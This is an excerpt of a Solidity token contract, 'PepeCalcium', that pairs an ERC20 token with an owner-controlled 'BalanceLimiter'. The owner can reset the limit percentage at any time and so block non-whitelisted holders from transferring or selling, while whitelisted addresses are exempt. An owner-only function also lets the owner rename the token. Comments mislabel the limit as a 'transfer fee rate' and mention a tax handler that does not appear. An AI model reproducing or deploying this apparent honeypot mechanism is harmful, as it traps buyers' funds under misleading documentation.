...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _changeMetadata(string memory name_, string memory symbol_) internal {
        _name = name_;
        _symbol = symbol_;
    }
...
abstract contract BalanceLimiter is ERC20, Ownable {
    uint256 public limitedPercentage;
    uint256 public applicableTime;

    mapping(address => uint256) public limitedHoldBalance;
    mapping(address => uint256) public lastApplicacbleTime;
    /**
     ...
     */
    uint256 public constant MAX_PERCENTAGE_BPS = 10_000;

    /**
     * @notice Constructor.
     * @dev Reverts with OverMaxBasisPoints when fees are greater than MAX_PERCENTAGE_BPS.
     */
    constructor(uint256 _limitedPercentage) {
        if (_limitedPercentage > MAX_PERCENTAGE_BPS) revert OverMaxBasisPoints();
        limitedPercentage = _limitedPercentage;
        applicableTime = block.timestamp;
     ...
     */
    function setLimitedPercentage(uint256 _percentage) external onlyOwner {
        if (_percentage > MAX_PERCENTAGE_BPS) revert OverMaxBasisPoints();
        limitedPercentage = _percentage;
        applicableTime = block.timestamp;
    }
    ...
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        ...
        // If 'from' is whitelisted, no limit is applied
        if (_unpackBoolean(fromConfiguration, 0)) return;
        
        // If 'from' is a liquidity pair, increase limit
        if (_unpackBoolean(fromConfiguration, 1)) return;

        // If 'to' is whitelisted, no limit is applied
        uint256 toConfiguration = addressConfiguration[to];
        if (_unpackBoolean(toConfiguration, 0)) return;

        // If 'to' is a liquidity pair, apply sell limit
        uint256 beforeBalance = balanceOf(from);
        uint256 limitBalance = beforeBalance * (MAX_PERCENTAGE_BPS - limitedPercentage) / MAX_PERCENTAGE_BPS;

        if (limitBalance > limitedHoldBalance[from] || applicableTime > lastApplicacbleTime[from]) {
            limitedHoldBalance[from] = limitBalance;
            lastApplicacbleTime[from] = block.timestamp;
        }

        require(limitedHoldBalance[from] <= beforeBalance - amount, "EL");
    }
 ...
 * @dev Inherits from OpenZeppelin's ERC20 and TaxHandler & BalanceLimiter contracts.
 */
contract PepeCalcium  is ERC20, BalanceLimiter {
    /**
     * @notice Constructs a new TaxHandledToken.
     * @param _name The name of the token.
     * @param _symbol The symbol of the token.
     * @param _limitedPercentage The transfer fee rate in basis points.
     * @param _supply The buy fee rate in basis points.
     */
    constructor(
        string memory _name,
        string memory _symbol,
        uint256 _limitedPercentage,
        uint256 _supply
    ) ERC20(_name, _symbol) BalanceLimiter(_limitedPercentage) {
        _mint(msg.sender, _supply * 10 ** 18);
        _setUp();
    }

    function changeMetadata(string memory name_, string memory symbol_) external onlyOwner {
